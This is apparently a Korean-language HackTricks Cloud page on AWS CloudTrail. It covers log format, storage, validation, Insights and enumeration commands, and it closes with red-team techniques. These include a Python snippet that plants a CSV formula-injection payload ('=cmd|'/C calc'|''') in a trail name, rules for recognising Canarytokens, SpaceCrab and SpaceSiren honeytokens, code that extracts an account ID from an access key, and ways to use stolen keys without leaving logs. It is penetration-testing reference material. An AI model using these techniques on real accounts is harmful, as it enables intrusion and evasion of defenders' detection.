# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **ëŠ” AWS í™˜ê²½ ë‚´ì˜ í™œë™ì„ ê¸°ë¡í•˜ê³  ëª¨ë‹ˆí„°ë§í•©ë‹ˆë‹¤**. ì´ëŠ” AWS ë¦¬ì†ŒìŠ¤ì™€ì˜ ëª¨ë“  ìƒí˜¸ì‘ìš©ì— ëŒ€í•´ ëˆ„ê°€ ë¬´ì—‡ì„, ì–¸ì œ, ì–´ë””ì„œ í–ˆëŠ”ì§€ë¥¼ í¬í•¨í•œ ìì„¸í•œ **ì´ë²¤íŠ¸ ë¡œê·¸**ë¥¼ ìº¡ì²˜í•©ë‹ˆë‹¤. ì´ëŠ” ë³€ê²½ ì‚¬í•­ ë° ì‘ì—…ì˜ ê°ì‚¬ ì¶”ì ì„ ì œê³µí•˜ì—¬ ë³´ì•ˆ ë¶„ì„, ì¤€ìˆ˜ ê°ì‚¬ ë° ë¦¬ì†ŒìŠ¤ ë³€ê²½ ì¶”ì ì— ë„ì›€ì„ ì¤ë‹ˆë‹¤. CloudTrailì€ ì‚¬ìš©ì ë° ë¦¬ì†ŒìŠ¤ í–‰ë™ì„ ì´í•´í•˜ê³ , ë³´ì•ˆ íƒœì„¸ë¥¼ ê°•í™”í•˜ë©°, ê·œì œ ì¤€ìˆ˜ë¥¼ ë³´ì¥í•˜ëŠ” ë° í•„ìˆ˜ì ì…ë‹ˆë‹¤.

ê° ê¸°ë¡ëœ ì´ë²¤íŠ¸ëŠ” ë‹¤ìŒì„ í¬í•¨í•©ë‹ˆë‹¤:

* í˜¸ì¶œëœ APIì˜ ì´ë¦„: `eventName`
* í˜¸ì¶œëœ ì„œë¹„ìŠ¤: `eventSource`
* ì‹œê°„: `eventTime`
* IP ì£¼ì†Œ: `SourceIPAddress`
* ì—ì´ì „íŠ¸ ë°©ë²•: `userAgent`. ì˜ˆ:
* Signing.amazonaws.com - AWS ê´€ë¦¬ ì½˜ì†”ì—ì„œ
* console.amazonaws.com - ê³„ì •ì˜ ë£¨íŠ¸ ì‚¬ìš©ì
* lambda.amazonaws.com - AWS Lambda
* ìš”ì²­ ë§¤ê°œë³€ìˆ˜: `requestParameters`
* ì‘ë‹µ ìš”ì†Œ: `responseElements`

ì´ë²¤íŠ¸ëŠ” **ì•½ 5ë¶„ë§ˆë‹¤ JSON íŒŒì¼ë¡œ ìƒˆë¡œìš´ ë¡œê·¸ íŒŒì¼ì— ê¸°ë¡ë˜ë©°**, CloudTrailì— ì˜í•´ ë³´ê´€ë˜ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ ë¡œê·¸ íŒŒì¼ì€ **ì•½ 15ë¶„ í›„ S3ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤**.\
CloudTrail ë¡œê·¸ëŠ” **ê³„ì • ë° ì§€ì—­ ê°„ì— ì§‘ê³„ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
CloudTrailì€ **ë¡œê·¸ íŒŒì¼ ë¬´ê²°ì„±ì„ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ íŒŒì¼ì´ CloudTrailì´ ì „ë‹¬í•œ ì´í›„ ë³€ê²½ë˜ì§€ ì•Šì•˜ìŒì„ í™•ì¸í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤**. ì´ëŠ” ë¡œê·¸ì˜ SHA-256 í•´ì‹œë¥¼ ë‹¤ì´ì œìŠ¤íŠ¸ íŒŒì¼ ë‚´ì— ìƒì„±í•©ë‹ˆë‹¤. ìƒˆë¡œìš´ ë¡œê·¸ì˜ sha-256 í•´ì‹œëŠ” ë§¤ì‹œê°„ ìƒì„±ë©ë‹ˆë‹¤.\
Trailì„ ìƒì„±í•  ë•Œ ì´ë²¤íŠ¸ ì„ íƒê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¸°ë¡í•  Trailì„ ê´€ë¦¬, ë°ì´í„° ë˜ëŠ” ì¸ì‚¬ì´íŠ¸ ì´ë²¤íŠ¸ë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¡œê·¸ëŠ” S3 ë²„í‚·ì— ì €ì¥ë©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ ì„œë²„ ì¸¡ ì•”í˜¸í™”(SSE-S3)ê°€ ì‚¬ìš©ë˜ë¯€ë¡œ AWSëŠ” ì ‘ê·¼ ê¶Œí•œì´ ìˆëŠ” ì‚¬ëŒë“¤ì„ ìœ„í•´ ì½˜í…ì¸ ë¥¼ ë³µí˜¸í™”í•˜ì§€ë§Œ, ì¶”ê°€ ë³´ì•ˆì„ ìœ„í•´ KMSì™€ ìì‹ ì˜ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ SSEë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¡œê·¸ëŠ” **ë‹¤ìŒ ì´ë¦„ í˜•ì‹ì˜ S3 ë²„í‚·ì— ì €ì¥ë©ë‹ˆë‹¤**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* ì˜ˆ: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

ê° í´ë” ë‚´ì˜ ê° ë¡œê·¸ëŠ” **ë‹¤ìŒ í˜•ì‹ì„ ë”°ë¥´ëŠ” ì´ë¦„ì„ ê°€ì§‘ë‹ˆë‹¤**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

ë¡œê·¸ íŒŒì¼ ëª…ëª… ê·œì¹™

![](<../../../../.gitbook/assets/image (122).png>)

ë˜í•œ, **íŒŒì¼ ë¬´ê²°ì„±ì„ í™•ì¸í•˜ê¸° ìœ„í•œ ë‹¤ì´ì œìŠ¤íŠ¸ íŒŒì¼**ì€ **ê°™ì€ ë²„í‚·** ë‚´ì— ìˆìŠµë‹ˆë‹¤:

![](<../../../../.gitbook/assets/image (195).png>)

### ì—¬ëŸ¬ ê³„ì •ì˜ ë¡œê·¸ ì§‘ê³„

* ë¡œê·¸ íŒŒì¼ì´ ì „ë‹¬ë  AWS ê³„ì •ì—ì„œ Trailì„ ìƒì„±í•©ë‹ˆë‹¤.
* CloudTrailì— ëŒ€í•œ êµì°¨ ê³„ì • ì ‘ê·¼ì„ í—ˆìš©í•˜ëŠ” ê¶Œí•œì„ ëŒ€ìƒ S3 ë²„í‚·ì— ì ìš©í•˜ê³  ì ‘ê·¼ì´ í•„ìš”í•œ ê° AWS ê³„ì •ì„ í—ˆìš©í•©ë‹ˆë‹¤.
* ë‹¤ë¥¸ AWS ê³„ì •ì—ì„œ ìƒˆ Trailì„ ìƒì„±í•˜ê³  1ë‹¨ê³„ì—ì„œ ìƒì„±ëœ ë²„í‚·ì„ ì‚¬ìš©í•˜ë„ë¡ ì„ íƒí•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ëª¨ë“  ë¡œê·¸ë¥¼ ë™ì¼í•œ S3 ë²„í‚·ì— ì €ì¥í•  ìˆ˜ ìˆì§€ë§Œ, ì—¬ëŸ¬ ê³„ì •ì˜ CloudTrail ë¡œê·¸ë¥¼ ë‹¨ì¼ AWS ê³„ì •ì— ì†í•˜ëŠ” CloudWatch Logsë¡œ ì§‘ê³„í•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤.

{% hint style="danger" %}
ê³„ì •ì€ **ë‹¤ë¥¸ Trails**ë¥¼ CloudTrail **ì—ì„œ í™œì„±í™”í•˜ì—¬ ë™ì¼í•œ(ë˜ëŠ” ë‹¤ë¥¸) ë¡œê·¸ë¥¼ ì„œë¡œ ë‹¤ë¥¸ ë²„í‚·ì— ì €ì¥í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì„ ê¸°ì–µí•˜ì„¸ìš”.
{% endhint %}

### ëª¨ë“  ì¡°ì§ ê³„ì •ì˜ CloudTrailì„ 1ê°œë¡œ

CloudTrailì„ ìƒì„±í•  ë•Œ, ì¡°ì§ì˜ ëª¨ë“  ê³„ì •ì— ëŒ€í•´ CloudTrailì„ í™œì„±í™”í•˜ê³  ë¡œê·¸ë¥¼ ë‹¨ì¼ ë²„í‚·ìœ¼ë¡œ ê°€ì ¸ì˜¤ë„ë¡ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

ì´ë ‡ê²Œ í•˜ë©´ ëª¨ë“  ê³„ì •ì˜ ëª¨ë“  ì§€ì—­ì—ì„œ CloudTrailì„ ì‰½ê²Œ êµ¬ì„±í•˜ê³  ë¡œê·¸ë¥¼ 1ê°œì˜ ê³„ì •(ë³´í˜¸í•´ì•¼ í•˜ëŠ” ê³„ì •)ìœ¼ë¡œ ì¤‘ì•™ ì§‘ì¤‘í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë¡œê·¸ íŒŒì¼ í™•ì¸

ë¡œê·¸ê°€ ë³€ê²½ë˜ì§€ ì•Šì•˜ëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrailì€ ìë™ìœ¼ë¡œ ë¡œê·¸ë¥¼ CloudWatchë¡œ ì „ì†¡í•  ìˆ˜ ìˆì–´ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í™œë™ì´ ìˆ˜í–‰ë  ë•Œ ê²½ê³ ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
CloudTrailì´ ë¡œê·¸ë¥¼ CloudWatchë¡œ ì „ì†¡í•  ìˆ˜ ìˆë„ë¡ í•˜ë ¤ë©´ **ì—­í• **ì„ ìƒì„±í•´ì•¼ í•˜ë©°, ì´ ì—­í• ì€ í•´ë‹¹ ì‘ì—…ì„ í—ˆìš©í•´ì•¼ í•©ë‹ˆë‹¤. ê°€ëŠ¥í•˜ë‹¤ë©´ ì´ëŸ¬í•œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ AWS ê¸°ë³¸ ì—­í• ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ì´ ì—­í• ì€ CloudTrailì´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤:

* CreateLogStream: CloudWatch Logs ë¡œê·¸ ìŠ¤íŠ¸ë¦¼ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* PutLogEvents: CloudTrail ë¡œê·¸ë¥¼ CloudWatch Logs ë¡œê·¸ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.

### Event History

CloudTrail Event HistoryëŠ” ê¸°ë¡ëœ ë¡œê·¸ë¥¼ í…Œì´ë¸”ì—ì„œ ê²€ì‚¬í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights**ëŠ” CloudTrail íŠ¸ë ˆì¼ì˜ ê´€ë¦¬ ì´ë²¤íŠ¸ë¥¼ ìë™ìœ¼ë¡œ **ë¶„ì„**í•˜ê³  **ë¹„ì •ìƒì ì¸ í™œë™**ì— ëŒ€í•´ **ê²½ê³ **í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì„¤ì •ëœ ê¸°ì¤€ì„ ê³¼ ë‹¤ë¥¸ `TerminateInstance` ì´ë²¤íŠ¸ì˜ ì¦ê°€ê°€ ìˆì„ ê²½ìš°, ì´ë¥¼ Insight ì´ë²¤íŠ¸ë¡œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì´ë²¤íŠ¸ëŠ” **ë¹„ì •ìƒì ì¸ API í™œë™ì„ ì°¾ê³  ëŒ€ì‘í•˜ëŠ” ê²ƒì„ ë” ì‰½ê²Œ** ë§Œë“¤ì–´ ì¤ë‹ˆë‹¤.

ì¸ì‚¬ì´íŠ¸ëŠ” CloudTrail ë¡œê·¸ì™€ ë™ì¼í•œ ë²„í‚·ì— ì €ì¥ë©ë‹ˆë‹¤: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>ë¡œê·¸ê°€ ë³€ì¡°ë˜ì—ˆëŠ”ì§€(ìˆ˜ì •ë˜ê±°ë‚˜ ì‚­ì œë¨) í™•ì¸</li><li><p>ë‹¤ì´ì œìŠ¤íŠ¸ íŒŒì¼ ì‚¬ìš©(ê° íŒŒì¼ì— ëŒ€í•œ í•´ì‹œ ìƒì„±)</p><ul><li>SHA-256 í•´ì‹±</li><li>ë””ì§€í„¸ ì„œëª…ì„ ìœ„í•œ RSAì™€ í•¨ê»˜ SHA-256</li><li>ì•„ë§ˆì¡´ì´ ì†Œìœ í•œ ê°œì¸ í‚¤</li></ul></li><li>ë‹¤ì´ì œìŠ¤íŠ¸ íŒŒì¼ ìƒì„±ì— 1ì‹œê°„ ì†Œìš”(ë§¤ ì‹œê°„ ì •ê°ì— ìˆ˜í–‰)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>IAM ì •ì±… ë° S3 ë²„í‚· ì •ì±… ì‚¬ìš©</p><ul><li>ë³´ì•ˆ íŒ€ â€”> ê´€ë¦¬ì ì ‘ê·¼</li><li>ê°ì‚¬ì â€”> ì½ê¸° ì „ìš© ì ‘ê·¼</li></ul></li><li>SSE-S3/SSE-KMSë¥¼ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ë¥¼ ì•”í˜¸í™”</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>IAM ë° ë²„í‚· ì •ì±…ìœ¼ë¡œ ì‚­ì œ ì ‘ê·¼ ì œí•œ</li><li>S3 MFA ì‚­ì œ êµ¬ì„±</li><li>ë¡œê·¸ íŒŒì¼ ê²€ì¦ìœ¼ë¡œ í™•ì¸</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access AdvisorëŠ” ë§ˆì§€ë§‰ 400ì¼ ë™ì•ˆì˜ AWS **CloudTrail ë¡œê·¸ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì¸ì‚¬ì´íŠ¸ë¥¼ ìˆ˜ì§‘í•©ë‹ˆë‹¤**. CloudTrailì€ AWS ê³„ì •ì—ì„œ ìˆ˜í–‰ëœ AWS API í˜¸ì¶œ ë° ê´€ë ¨ ì´ë²¤íŠ¸ì˜ ê¸°ë¡ì„ ìº¡ì²˜í•©ë‹ˆë‹¤. Access AdvisorëŠ” ì´ ë°ì´í„°ë¥¼ í™œìš©í•˜ì—¬ **ì„œë¹„ìŠ¤ê°€ ë§ˆì§€ë§‰ìœ¼ë¡œ ì–¸ì œ ì ‘ê·¼ë˜ì—ˆëŠ”ì§€** ë³´ì—¬ì¤ë‹ˆë‹¤. CloudTrail ë¡œê·¸ë¥¼ ë¶„ì„í•¨ìœ¼ë¡œì¨ Access AdvisorëŠ” IAM ì‚¬ìš©ì ë˜ëŠ” ì—­í• ì´ ì–´ë–¤ AWS ì„œë¹„ìŠ¤ì— ì ‘ê·¼í–ˆëŠ”ì§€ì™€ ê·¸ ì ‘ê·¼ì´ ì–¸ì œ ë°œìƒí–ˆëŠ”ì§€ë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” AWS ê´€ë¦¬ìê°€ **ê¶Œí•œì„ ì„¸ë¶„í™”í•˜ëŠ” ë° ì •ë³´ì— ê¸°ë°˜í•œ ê²°ì •ì„ ë‚´ë¦¬ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤**, ì‚¬ìš©ë˜ì§€ ì•Šì€ ì„œë¹„ìŠ¤ë“¤ì„ ì‹ë³„í•˜ê³  ì‹¤ì œ ì‚¬ìš© íŒ¨í„´ì— ë”°ë¼ ì§€ë‚˜ì¹˜ê²Œ ë„“ì€ ê¶Œí•œì„ ì¤„ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="success" %}
ë”°ë¼ì„œ Access AdvisorëŠ” **ì‚¬ìš©ìì—ê²Œ ë¶€ì—¬ëœ ë¶ˆí•„ìš”í•œ ê¶Œí•œ**ì— ëŒ€í•´ ì•Œë¦¬ë¯€ë¡œ ê´€ë¦¬ìê°€ ì´ë¥¼ ì œê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail ë‚´ì—ì„œ CVS ì£¼ì…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ë¡œê·¸ê°€ CSVë¡œ ë‚´ë³´ë‚´ì§€ê³  Excelë¡œ ì—´ë¦¬ë©´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìŒ ì½”ë“œëŠ” í˜ì´ë¡œë“œê°€ í¬í•¨ëœ ì˜ëª»ëœ Trail ì´ë¦„ìœ¼ë¡œ ë¡œê·¸ í•­ëª©ì„ ìƒì„±í•©ë‹ˆë‹¤:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
ë” ë§ì€ ì •ë³´ëŠ” CSV ì¸ì ì…˜ì— ëŒ€í•´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

ì´ íŠ¹ì • ê¸°ìˆ ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## **íƒì§€ ìš°íšŒ**

### HoneyTokens **ìš°íšŒ**

HoneytokensëŠ” **ë¯¼ê°í•œ ì •ë³´ì˜ ìœ ì¶œì„ íƒì§€í•˜ê¸° ìœ„í•´** ìƒì„±ë©ë‹ˆë‹¤. AWSì˜ ê²½ìš°, ì´ë“¤ì€ **ì‚¬ìš©ì´ ëª¨ë‹ˆí„°ë§ë˜ëŠ” AWS í‚¤**ì…ë‹ˆë‹¤. ë§Œì•½ ê·¸ í‚¤ë¡œ ì–´ë–¤ í–‰ë™ì´ íŠ¸ë¦¬ê±°ë˜ë©´, ëˆ„êµ°ê°€ ê·¸ í‚¤ë¥¼ í›”ì³¤ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)ì—ì„œ ìƒì„±ëœ HoneytokensëŠ” ì¸ì‹ ê°€ëŠ¥í•œ ê³„ì • ì´ë¦„ì„ ì‚¬ìš©í•˜ê±°ë‚˜ ëª¨ë“  ê³ ê°ì—ê²Œ ë™ì¼í•œ AWS ê³„ì • IDë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë”°ë¼ì„œ Cloudtrailì´ ë¡œê·¸ë¥¼ ìƒì„±í•˜ì§€ ì•Šê³  ê³„ì • ì´ë¦„ ë°/ë˜ëŠ” ê³„ì • IDë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤ë©´, **ê·¸ í‚¤ê°€ Honeytokenì¸ì§€ ì—¬ë¶€ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)ì—ëŠ” í‚¤ê°€ [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**ì— ì†í•˜ëŠ”ì§€ ê°ì§€í•˜ëŠ” ëª‡ ê°€ì§€ ê·œì¹™ì´ ìˆìŠµë‹ˆë‹¤:**

* **`canarytokens.org`**ê°€ ì—­í•  ì´ë¦„ì— ë‚˜íƒ€ë‚˜ê±°ë‚˜ ê³„ì • ID **`534261010715`**ê°€ ì˜¤ë¥˜ ë©”ì‹œì§€ì— ë‚˜íƒ€ë‚©ë‹ˆë‹¤.
* ìµœê·¼ì— í…ŒìŠ¤íŠ¸í•œ ê²°ê³¼, ê·¸ë“¤ì€ ê³„ì • **`717712589309`**ë¥¼ ì‚¬ìš©í•˜ê³  ìˆìœ¼ë©° ì—¬ì „íˆ ì´ë¦„ì— **`canarytokens.com`** ë¬¸ìì—´ì´ ìˆìŠµë‹ˆë‹¤.
* ì˜¤ë¥˜ ë©”ì‹œì§€ì˜ ì—­í•  ì´ë¦„ì— **`SpaceCrab`**ê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤.
* **SpaceSiren**ì€ ì‚¬ìš©ì ì´ë¦„ì„ ìƒì„±í•˜ê¸° ìœ„í•´ **uuids**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* **ì´ë¦„ì´ ë¬´ì‘ìœ„ë¡œ ìƒì„±ëœ ê²ƒì²˜ëŸ¼ ë³´ì¸ë‹¤ë©´**, ê·¸ê²ƒì´ HoneyTokenì¼ í™•ë¥ ì´ ë†’ìŠµë‹ˆë‹¤.

#### í‚¤ IDì—ì„œ ê³„ì • ID ê°€ì ¸ì˜¤ê¸°

**ì•¡ì„¸ìŠ¤ í‚¤** ë‚´ë¶€ì— **ì¸ì½”ë”©ëœ** **ê³„ì • ID**ë¥¼ [**ì—¬ê¸°ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) ê°€ì ¸ì˜¬ ìˆ˜ ìˆìœ¼ë©°, Honeytokens AWS ê³„ì • ëª©ë¡ê³¼ ê³„ì • IDë¥¼ í™•ì¸í•˜ì„¸ìš”:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### ë¡œê·¸ ìƒì„±í•˜ì§€ ì•Šê¸°

ê°€ì¥ íš¨ê³¼ì ì¸ ê¸°ìˆ ì€ ì‚¬ì‹¤ ê°„ë‹¨í•©ë‹ˆë‹¤. ë°©ê¸ˆ ì°¾ì€ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ìì‹ ì˜ ê³µê²©ì ê³„ì • ë‚´ì˜ ì¼ë¶€ ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ì„¸ìš”. ì´ë ‡ê²Œ í•˜ë©´ **CloudTrailì´ ë‹¹ì‹ ì˜ AWS ê³„ì • ë‚´ì— ë¡œê·¸ë¥¼ ìƒì„±í•˜ê³  í”¼í•´ìì˜ ê³„ì •ì—ëŠ” ìƒì„±í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.

ë¬¸ì œëŠ” ì¶œë ¥ì— ê³„ì • IDì™€ ê³„ì • ì´ë¦„ì„ ë‚˜íƒ€ë‚´ëŠ” ì˜¤ë¥˜ê°€ í‘œì‹œë˜ë¯€ë¡œ **Honeytokenì¸ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### ë¡œê·¸ê°€ ì—†ëŠ” AWS ì„œë¹„ìŠ¤

ê³¼ê±°ì—ëŠ” **CloudTrailì— ë¡œê·¸ë¥¼ ì „ì†¡í•˜ì§€ ì•ŠëŠ” AWS ì„œë¹„ìŠ¤ê°€ ìˆì—ˆìŠµë‹ˆë‹¤** (ì—¬ê¸°ì—ì„œ [ëª©ë¡ì„ ì°¾ìœ¼ì„¸ìš”](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ ì¤‘ ì¼ë¶€ëŠ” **ë¬´ë‹¨ ì ‘ê·¼** (Honeytoken í‚¤)ì´ ì‹œë„ë  ê²½ìš° **í‚¤ ì—­í• ì˜ ARN**ì„ í¬í•¨í•œ **ì˜¤ë¥˜**ë¡œ **ì‘ë‹µ**í•©ë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ **ê³µê²©ìëŠ” ë¡œê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ì§€ ì•Šê³  í‚¤ì˜ ARNì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ARNì—ì„œ ê³µê²©ìëŠ” **AWS ê³„ì • IDì™€ ì´ë¦„**ì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, HoneyTokenì˜ íšŒì‚¬ ê³„ì • IDì™€ ì´ë¦„ì„ ì‰½ê²Œ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” í† í°ì´ HoneyTokenì¸ì§€ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
ëª¨ë“  ê³µìš© APIê°€ CloudTrail ë¡œê·¸ë¥¼ ìƒì„±í•˜ì§€ ì•Šë„ë¡ ë°œê²¬ëœ ê²ƒì€ ì´ì œ ìˆ˜ì •ë˜ì—ˆìœ¼ë¯€ë¡œ, ì•„ë§ˆë„ ë‹¹ì‹ ë§Œì˜ ê²ƒì„ ì°¾ì•„ì•¼ í•  ê²ƒì…ë‹ˆë‹¤...

ìì„¸í•œ ë‚´ìš©ì€ [**original research**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.
{% endhint %}

### ì œ3 ì¸í”„ë¼ ì ‘ê·¼

